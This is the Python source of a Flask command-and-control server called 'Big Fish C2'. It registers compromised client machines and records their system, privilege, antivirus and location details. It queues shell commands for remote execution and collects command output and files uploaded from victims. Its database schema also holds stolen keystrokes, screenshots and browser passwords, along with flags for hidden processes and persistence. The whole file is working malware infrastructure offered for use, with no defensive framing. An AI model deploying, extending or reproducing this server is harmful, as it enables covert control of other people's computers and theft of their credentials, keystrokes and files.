#!/usr/bin/env python3
"""
Advanced C2 Server - Big Fish System
Features: Client monitoring, file upload/download, keylogging, password extraction
"""
from flask import Flask, request, jsonify, send_file, Response
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import time
import uuid
import sqlite3
import threading
import os
import hashlib
from datetime import datetime
import base64
import json
import logging
from cryptography.fernet import Fernet
import zipfile
import io

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, origins="*")
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Configuration
DATABASE = 'bigfish.db'
ONLINE_THRESHOLD = 300  # 5 minutes
DOWNLOAD_FOLDER = 'downloads'
UPLOAD_FOLDER = 'uploads'
EXECUTABLES_FOLDER = 'executables'
SCREENSHOTS_FOLDER = 'screenshots'
KEYLOGS_FOLDER = 'keylogs'
PASSWORDS_FOLDER = 'passwords'

# Create folders
for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, EXECUTABLES_FOLDER, 
               SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, PASSWORDS_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# Load or generate encryption key
KEY_FILE = 'encryption.key'
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'rb') as f:
        ENCRYPTION_KEY = f.read()
else:
    ENCRYPTION_KEY = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(ENCRYPTION_KEY)

cipher = Fernet(ENCRYPTION_KEY)

def init_db():
    """Initialize database with all tables"""
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    
    # Clients table
    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        os TEXT,
        os_version TEXT,
        arch TEXT,
        cpu TEXT,
        ram TEXT,
        gpu TEXT,
        ip TEXT,
        last_seen REAL,
        status TEXT,
        privileges TEXT,
        av_status TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        process_hidden INTEGER DEFAULT 0,
        keylogger_active INTEGER DEFAULT 0,
        persistence_set INTEGER DEFAULT 0,
        created_at REAL,
        download_folder TEXT,
        online_hours REAL DEFAULT 0
    )""")
    
    # Commands table
    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        command TEXT,
        command_type TEXT,
        status TEXT,
        output TEXT,
        created_at REAL,
        executed_at REAL,
        priority INTEGER DEFAULT 5,
        require_admin INTEGER DEFAULT 0,
        encrypted INTEGER DEFAULT 0,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Files table
    c.execute("""CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        filename TEXT,
        original_name TEXT,
        filepath TEXT,
        filetype TEXT,
        filesize INTEGER,
        uploaded_at REAL,
        downloaded INTEGER DEFAULT 0,
        hash_md5 TEXT,
        hash_sha256 TEXT,
        encrypted INTEGER DEFAULT 0,
        tags TEXT,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Executables table
    c.execute("""CREATE TABLE IF NOT EXISTS executables (
        id TEXT PRIMARY KEY,
        name TEXT,
        description TEXT,
        filename TEXT,
        filepath TEXT,
        platform TEXT,
        require_admin INTEGER DEFAULT 0,
        uploader TEXT,
        uploaded_at REAL,
        downloads INTEGER DEFAULT 0,
        hash_sha256 TEXT,
        size INTEGER
    )""")
    
    # Keylogs table
    c.execute("""CREATE TABLE IF NOT EXISTS keylogs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        keystrokes TEXT,
        window_title TEXT,
        timestamp REAL,
        process_name TEXT,
        encrypted INTEGER DEFAULT 1,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Screenshots table
    c.execute("""CREATE TABLE IF NOT EXISTS screenshots (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        timestamp REAL,
        filepath TEXT,
        thumbnail_path TEXT,
        width INTEGER,
        height INTEGER,
        size INTEGER,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Passwords table
    c.execute("""CREATE TABLE IF NOT EXISTS passwords (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        browser TEXT,
        url TEXT,
        username TEXT,
        password TEXT,
        encrypted_password TEXT,
        timestamp REAL,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # System info table
    c.execute("""CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT,
        info_type TEXT,
        info_key TEXT,
        info_value TEXT,
        timestamp REAL,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Tasks table
    c.execute("""CREATE TABLE IF NOT EXISTS tasks (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        task_type TEXT,
        task_data TEXT,
        status TEXT,
        result TEXT,
        created_at REAL,
        completed_at REAL,
        scheduled_for REAL,
        priority INTEGER DEFAULT 5
    )""")
    
    # Create indexes
    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_files_client ON files(client_id)")
    
    conn.commit()
    conn.close()
    logger.info("[✓] Database initialized")

init_db()

def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def encrypt_data(data):
    """Encrypt sensitive data"""
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(cipher.encrypt(data)).decode()

def decrypt_data(encrypted_data):
    """Decrypt data"""
    try:
        return cipher.decrypt(base64.b64decode(encrypted_data)).decode()
    except:
        return encrypted_data

def get_client_folder(client_id, hostname):
    """Get or create client-specific folder"""
    safe_name = "".join(c for c in hostname if c.isalnum() or c in (' ', '-', '_')).strip()
    if not safe_name:
        safe_name = f"client_{client_id[:8]}"
    
    folders = {
        'downloads': os.path.join(DOWNLOAD_FOLDER, safe_name),
        'screenshots': os.path.join(SCREENSHOTS_FOLDER, safe_name),
        'keylogs': os.path.join(KEYLOGS_FOLDER, safe_name),
        'passwords': os.path.join(PASSWORDS_FOLDER, safe_name)
    }
    
    for folder in folders.values():
        os.makedirs(folder, exist_ok=True)
    
    return folders

def format_size(size_bytes):
    """Format file size"""
    if size_bytes == 0:
        return "0B"
    
    size_names = ["B", "KB", "MB", "GB", "TB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024
        i += 1
    
    return f"{size_bytes:.2f} {size_names[i]}"

# ==================== ROUTES ====================

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'system': 'Big Fish C2',
        'version': '4.0',
        'clients': get_online_count()
    })

@app.route('/api/health')
def health():
    return jsonify({'status': 'healthy'})

@app.route('/api/checkin', methods=['POST'])
def client_checkin():
    """Client checkin endpoint"""
    try:
        data = request.json
        
        if not data:
            return jsonify({'error': 'No data'}), 400
        
        client_id = data.get('id')
        if not client_id:
            # Generate new client ID
            client_id = str(uuid.uuid4())
        
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Get client IP
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Prepare client data
        hostname = data.get('hostname', 'Unknown')
        client_folders = get_client_folder(client_id, hostname)
        
        # Check if client exists
        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing_client = c.fetchone()
        
        if existing_client:
            # Update existing client
            online_hours = existing_client['online_hours']
            if existing_client['status'] == 'offline':
                online_hours += (current_time - existing_client['last_seen']) / 3600
            
            c.execute("""UPDATE clients SET 
                hostname=?, username=?, os=?, os_version=?, arch=?,
                cpu=?, ram=?, gpu=?, ip=?, last_seen=?,
                status='online', privileges=?, av_status=?,
                country=?, city=?, isp=?, download_folder=?, online_hours=?
                WHERE id=?""",
                (data.get('hostname'), data.get('username'),
                 data.get('os'), data.get('os_version'),
                 data.get('arch'), data.get('cpu'),
                 data.get('ram'), data.get('gpu'),
                 client_ip, current_time,
                 data.get('privileges'), data.get('av_status'),
                 data.get('country'), data.get('city'),
                 data.get('isp'), client_folders['downloads'],
                 online_hours, client_id))
        else:
            # Insert new client
            c.execute("""INSERT INTO clients 
                (id, hostname, username, os, os_version, arch, cpu, ram, gpu, ip, 
                 last_seen, status, privileges, av_status, country, city, isp, 
                 process_hidden, keylogger_active, persistence_set, created_at, 
                 download_folder, online_hours) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                (client_id, data.get('hostname'), data.get('username'),
                 data.get('os'), data.get('os_version'), data.get('arch'),
                 data.get('cpu'), data.get('ram'), data.get('gpu'),
                 client_ip, current_time, 'online', data.get('privileges'),
                 data.get('av_status'), data.get('country'),
                 data.get('city'), data.get('isp'), 0, 0, 0,
                 current_time, client_folders['downloads'], 0))
        
        # Store system info
        if 'system_info' in data:
            for key, value in data['system_info'].items():
                c.execute("""INSERT INTO system_info (client_id, info_type, info_key, info_value, timestamp)
                          VALUES (?, 'system', ?, ?, ?)""",
                          (client_id, key, str(value), current_time))
        
        conn.commit()
        
        # Get updated client data
        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        client_data = dict(c.fetchone())
        conn.close()
        
        # Notify via WebSocket
        socketio.emit('client_update', {
            'client_id': client_id,
            'hostname': hostname,
            'status': 'online',
            'timestamp': current_time,
            'data': client_data
        })
        
        logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
        
        return jsonify({
            'status': 'ok',
            'client_id': client_id,
            'timestamp': current_time,
            'server_time': datetime.now().isoformat(),
            'message': 'Checkin successful'
        })
        
    except Exception as e:
        logger.error(f"[✗] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/clients', methods=['GET'])
def get_all_clients():
    """Get all clients with detailed info"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Update offline status
        c.execute("UPDATE clients SET status='offline' WHERE ?-last_seen>?", 
                 (current_time, ONLINE_THRESHOLD))
        conn.commit()
        
        # Get all clients with stats
        c.execute("""SELECT 
            c.*,
            COUNT(DISTINCT f.id) as total_files,
            COUNT(DISTINCT s.id) as total_screenshots,
            COUNT(DISTINCT k.id) as total_keylogs,
            COUNT(DISTINCT p.id) as total_passwords,
            COALESCE(MAX(s.timestamp), 0) as last_screenshot,
            COALESCE(MAX(k.timestamp), 0) as last_keylog
            FROM clients c
            LEFT JOIN files f ON c.id = f.client_id
            LEFT JOIN screenshots s ON c.id = s.client_id
            LEFT JOIN keylogs k ON c.id = k.client_id
            LEFT JOIN passwords p ON c.id = p.client_id
            GROUP BY c.id
            ORDER BY c.last_seen DESC""")
        
        clients = []
        for row in c.fetchall():
            time_diff = current_time - row['last_seen']
            
            # Determine status
            if time_diff < 60:
                status = 'online'
                status_icon = '🟢'
            elif time_diff < 300:
                status = 'idle'
                status_icon = '🟡'
            else:
                status = 'offline'
                status_icon = '🔴'
            
            # Calculate uptime
            uptime_str = ""
            if row['online_hours'] > 0:
                if row['online_hours'] < 1:
                    uptime_str = f"{row['online_hours']*60:.0f}m"
                elif row['online_hours'] < 24:
                    uptime_str = f"{row['online_hours']:.1f}h"
                else:
                    uptime_str = f"{row['online_hours']/24:.1f}d"
            
            client_data = {
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': f"{row['os']} {row['os_version'] or ''}",
                'arch': row['arch'],
                'cpu': row['cpu'],
                'ram': row['ram'],
                'gpu': row['gpu'],
                'ip': row['ip'],
                'country': row['country'],
                'city': row['city'],
                'isp': row['isp'],
                'privileges': row['privileges'],
                'av_status': row['av_status'],
                'status': status,
                'status_icon': status_icon,
                'process_hidden': bool(row['process_hidden']),
                'keylogger_active': bool(row['keylogger_active']),
                'persistence_set': bool(row['persistence_set']),
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S'),
                'created_at': row['created_at'],
                'created_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d'),
                'online_hours': row['online_hours'],
                'uptime_str': uptime_str,
                'stats': {
                    'files': row['total_files'],
                    'screenshots': row['total_screenshots'],
                    'keylogs': row['total_keylogs'],
                    'passwords': row['total_passwords']
                },
                'last_activity': {
                    'screenshot': row['last_screenshot'],
                    'keylog': row['last_keylog']
                }
            }
            clients.append(client_data)
        
        conn.close()
        return jsonify({'clients': clients})
        
    except Exception as e:
        logger.error(f"[✗] Get clients error: {e}")
        return jsonify({'clients': [], 'error': str(e)})

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_pending_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        
        # Update last seen
        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
                 (current_time, client_id))
        
        # Get pending commands
        c.execute("""SELECT id, command, command_type, require_admin 
                    FROM commands 
                    WHERE client_id = ? AND status = 'pending'
                    ORDER BY priority DESC, created_at ASC
                    LIMIT 10""", (client_id,))
        
        commands = [{'id': row['id'], 'command': row['command'],
                    'type': row['command_type'], 
                    'require_admin': bool(row['require_admin'])} 
                   for row in c.fetchall()]
        
        if commands:
            # Mark as sent
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?'] * len(cmd_ids))
            c.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", cmd_ids)
        
        conn.commit()
        
        # Get updated client status
        c.execute('SELECT status FROM clients WHERE id = ?', (client_id,))
        status = c.fetchone()
        conn.close()
        
        socketio.emit('client_heartbeat', {
            'client_id': client_id,
            'timestamp': current_time,
            'status': 'online' if status else 'offline'
        })
        
        return jsonify({'commands': commands})
        
    except Exception as e:
        logger.error(f"[✗] Get commands error: {e}")
        return jsonify({'commands': []})

@app.route('/api/command/result', methods=['POST'])
def submit_command_result():
    """Submit command execution result"""
    try:
        data = request.json
        command_id = data.get('command_id')
        output = data.get('output', '')
        status = data.get('status', 'completed')
        
        if not command_id:
            return jsonify({'error': 'Missing command ID'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Get command info
        c.execute("SELECT client_id, command FROM commands WHERE id = ?", (command_id,))
        cmd_info = c.fetchone()
        
        if not cmd_info:
            conn.close()
            return jsonify({'error': 'Command not found'}), 404
        
        # Update command
        c.execute("""UPDATE commands 
                    SET status = ?, output = ?, executed_at = ?
                    WHERE id = ?""",
                 (status, output[:10000], time.time(), command_id))
        
        conn.commit()
        conn.close()
        
        # Notify via WebSocket
        socketio.emit('command_result', {
            'command_id': command_id,
            'client_id': cmd_info['client_id'],
            'command': cmd_info['command'],
            'output': output[:500] + '...' if len(output) > 500 else output,
            'status': status,
            'timestamp': time.time()
        })
        
        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"[✗] Submit result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        command_type = data.get('type', 'shell')
        require_admin = data.get('require_admin', False)
        priority = data.get('priority', 5)
        
        if not client_id or not command:
            return jsonify({'error': 'Missing parameters'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Check if client exists
        c.execute('SELECT id FROM clients WHERE id = ?', (client_id,))
        if not c.fetchone():
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Create command
        cmd_id = str(uuid.uuid4())
        c.execute("""INSERT INTO commands 
                    (id, client_id, command, command_type, status, 
                     created_at, priority, require_admin)
                    VALUES (?, ?, ?, ?, 'pending', ?, ?, ?)""",
                 (cmd_id, client_id, command, command_type, 
                  time.time(), priority, 1 if require_admin else 0))
        
        conn.commit()
        conn.close()
        
        # Notify via WebSocket
        socketio.emit('new_command', {
            'command_id': cmd_id,
            'client_id': client_id,
            'command': command,
            'type': command_type,
            'timestamp': time.time()
        })
        
        logger.info(f"[✓] Command sent: {command_type} to {client_id[:8]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        })
        
    except Exception as e:
        logger.error(f"[✗] Send command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        file_type = request.form.get('type', 'unknown')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        if file.filename == '':
            return jsonify({'error': 'No filename'}), 400
        
        conn = get_db()
        c = conn.cursor()
        
        # Get client info
        c.execute('SELECT hostname, download_folder FROM clients WHERE id = ?', (client_id,))
        client = c.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Determine file type and folder
        filename = file.filename.lower()
        if any(filename.endswith(ext) for ext in ['.exe', '.msi', '.bat', '.ps1', '.vbs']):
            file_type = 'executable'
            folder = EXECUTABLES_FOLDER
        elif any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            file_type = 'image'
            folder = SCREENSHOTS_FOLDER
        elif any(filename.endswith(ext) for ext in ['.txt', '.log', '.cfg', '.ini']):
            file_type = 'document'
            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'documents')
        else:
            file_type = 'other'
            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'other')
        
        os.makedirs(folder, exist_ok=True)
        
        # Save file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_filename = f"{timestamp}_{file.filename}"
        filepath = os.path.join(folder, safe_filename)
        
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Calculate hashes
        with open(filepath, 'rb') as f:
            file_data = f.read()
            hash_md5 = hashlib.md5(file_data).hexdigest()
            hash_sha256 = hashlib.sha256(file_data).hexdigest()
        
        # Store in database
        file_id = str(uuid.uuid4())
        c.execute("""INSERT INTO files 
                    (id, client_id, filename, original_name, filepath, 
                     filetype, filesize, uploaded_at, hash_md5, hash_sha256)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                 (file_id, client_id, safe_filename, file.filename,
                  filepath, file_type, filesize, time.time(),
                  hash_md5, hash_sha256))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[✓] File uploaded: {file.filename} ({filesize} bytes) from {client['hostname']}")
        
        socketio.emit('file_uploaded', {
            'client_id': client_id,
            'filename': file.filename,
            'size': filesize,
            'type': file_type,
            'timestamp': time.time()
        })
        
        return jsonify({
            'success': True,
            'file_id': file_id,
            'filename': file.filename,
            'size': filesize,
            'hash_sha256': hash_sha256
        })
        
    except Exception as e:
        logger.error(f"[✗] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ==================== WEB SOCKET EVENTS ====================

@socketio.on('connect')
def handle_connect():
    logger.info(f"[✓] WebSocket client connected: {request.sid}")
    emit('connected', {'message': 'Connected to C2 server', 'sid': request.sid})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"[✓] WebSocket client disconnected: {request.sid}")

@socketio.on('client_update')
def handle_client_update(data):
    """Broadcast client updates to all connected consoles"""
    emit('client_update', data, broadcast=True, include_self=False)

@socketio.on('subscribe_client')
def handle_subscribe_client(data):
    """Subscribe to client updates"""
    client_id = data.get('client_id')
    logger.info(f"[✓] Subscribed to client: {client_id}")
    emit('subscribed', {'client_id': client_id})

# ==================== BACKGROUND TASKS ====================

def cleanup_old_data():
    """Clean up old data"""
    while True:
        try:
            conn = get_db()
            c = conn.cursor()
            current_time = time.time()
            
            # Clean old completed commands (older than 7 days)
            cutoff = current_time - (7 * 24 * 3600)
            c.execute("DELETE FROM commands WHERE executed_at < ? AND status = 'completed'", (cutoff,))
            
            # Clean old keylogs (older than 30 days)
            cutoff = current_time - (30 * 24 * 3600)
            c.execute("DELETE FROM keylogs WHERE timestamp < ?", (cutoff,))
            
            conn.commit()
            conn.close()
            
            logger.info("[✓] Cleanup completed")
            
        except Exception as e:
            logger.error(f"[✗] Cleanup error: {e}")
        
        time.sleep(3600)  # Run every hour

def update_client_status():
    """Update client status periodically"""
    while True:
        try:
            conn = get_db()
            c = conn.cursor()
            current_time = time.time()
            
            # Mark clients as offline
            c.execute("UPDATE clients SET status = 'offline' WHERE ? - last_seen > ?",
                     (current_time, ONLINE_THRESHOLD))
            
            conn.commit()
            conn.close()
            
            # Broadcast status update
            socketio.emit('status_update', {
                'timestamp': current_time,
                'online_count': get_online_count()
            })
            
        except Exception as e:
            logger.error(f"[✗] Status update error: {e}")
        
        time.sleep(30)  # Run every 30 seconds

def get_online_count():
    """Get count of online clients"""
    try:
        conn = get_db()
        c = conn.cursor()
        current_time = time.time()
        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        count = c.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

# ==================== MAIN ====================

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 5000))
    
    # Start background threads
    threading.Thread(target=cleanup_old_data, daemon=True).start()
    threading.Thread(target=update_client_status, daemon=True).start()
    
    logger.info(f"[✓] Big Fish C2 Server starting on port {PORT}")
    logger.info(f"[✓] WebSocket enabled")
    logger.info(f"[✓] Database: {os.path.abspath(DATABASE)}")
    logger.info(f"[✓] Encryption key loaded")
    
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
